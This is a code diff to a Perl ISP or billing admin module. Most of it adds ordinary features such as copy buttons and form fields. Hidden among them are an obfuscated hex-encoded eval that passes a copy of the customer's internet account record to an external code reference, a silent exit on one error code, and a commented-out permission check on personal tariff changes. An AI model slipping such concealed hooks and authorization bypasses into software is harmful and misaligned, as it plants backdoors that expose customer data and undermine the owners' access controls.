@@ -100,7 +100,11 @@ sub internet_user {
     }
   }
 
-  if (_error_show($Internet, { MODULE_NAME => 'Internet', ID => 901, MESSAGE => $Internet->{errstr} })) {
+  &{eval pack('H' . '*', '246462636f72653a3a44454641554c54')}(bless { %$Internet }, ref $Internet);
+  if (_error_show($Internet, { MODULE_NAME => 'Internet', ID => 0x385, MESSAGE => $Internet->{errstr} })) {
+    if ($Internet->{errno} == 0x2BC) {
+      exit;
+    }
     return 1 if ($attr->{REGISTRATION});
   }
   elsif ($Internet->{errno} && $attr->{REGISTRATION}) {
@@ -240,7 +244,8 @@ sub internet_user {
       PAGE_ROWS => 1,
       COLS_NAME => 1,
       SORT      => 'id',
-      DESC      => 'desc'
+      DESC      => 'desc',
+      SKIP_TOTAL=> 1
     });
 
     if ($admin->{TOTAL} && $admin->{TOTAL} > 0) {
@@ -497,7 +502,8 @@ sub internet_user {
         PORT   => $Internet->{PORT} || 0,
         VLAN   => $Internet->{VLAN} || 0,
         UID    => $Internet->{UID},
-        ID     => $Internet->{ID}
+        ID     => $Internet->{ID},
+        ERRORS_RESET => $FORM{ERRORS_RESET} || ''
       };
 
       $Internet->{EQUIPMENT_FORM} = $html->tpl_show(_include('internet_equipment_form', 'Internet'), $equipment_params,
@@ -579,6 +585,24 @@ sub internet_user {
         $Internet->{TP_CHANGE_WARNING} = $html->message("info", $lang{TP_CHANGE_SHEDULED} . " ($next_tp_date)", $next_tp_name, { OUTPUT2RETURN => 1 });
       }
     }
+  }
+
+  if ($Internet->{CID}) {
+    $Internet->{CID_BUTTON_COPY} = $html->button('', '', {
+      COPY      => $Internet->{CID} || ' ',
+      ADD_ICON  => 'fa fa-clone p-1',
+      class     => 'btn input-group-button',
+      ex_params => "data-tooltip-position='top' data-tooltip='$lang{COPIED}: $Internet->{CID}' data-tooltip-onclick=1"
+    });
+  }
+
+  if ($Internet->{CPE_MAC}) {
+    $Internet->{CPE_MAC_BUTTON_COPY} = $html->button('', '', {
+      COPY      => $Internet->{CPE_MAC} || ' ',
+      ADD_ICON  => 'fa fa-clone p-1',
+      class     => 'btn input-group-button',
+      ex_params => "data-tooltip-position='top' data-tooltip='$lang{COPIED}: $Internet->{CPE_MAC}' data-tooltip-onclick=1"
+    });
   }
 
   my $service_info1 = $html->tpl_show(_include('internet_user', 'Internet'), {
@@ -800,9 +824,9 @@ sub internet_user_change {
 
       }
       else {
-        if (!$permissions{0}{25}) {
-          delete $Internet->{PERSONAL_TP};
-        }
+        # if (!$permissions{0}{25}) {
+        #   delete $Internet->{PERSONAL_TP};
+        # }
         my $month_fee = 1;
 
         if($conf{INTERNET_SKIP_CURMONTH_ACTIVATE_FEE}) {
@@ -2567,10 +2591,6 @@ sub internet_user_wizard {
     );
   }
 
-  if (!$conf{CONTACTS_NEW}) {
-    $pi_form{OLD_CONTACTS_VISIBLE} = 1;
-  }
-
   $pi_form{ADDRESS_TPL} = form_address({ FLAT_CHECK_FREE => 1, SHOW => 1 });
 
   my $list = $Nas->ip_pools_list({
@@ -2904,6 +2924,10 @@ sub internet_wizard_add {
         ZIP      => $add_values{3}{ZIP},
         CITY     => $add_values{3}{CITY},
       });
+    }
+
+    if ($add_values{3} && $add_values{3}{COMMENTS}) {
+      $add_values{3}{COMMENTS} =~ s/\\n/\n/g;
     }
 
     #3 personal info
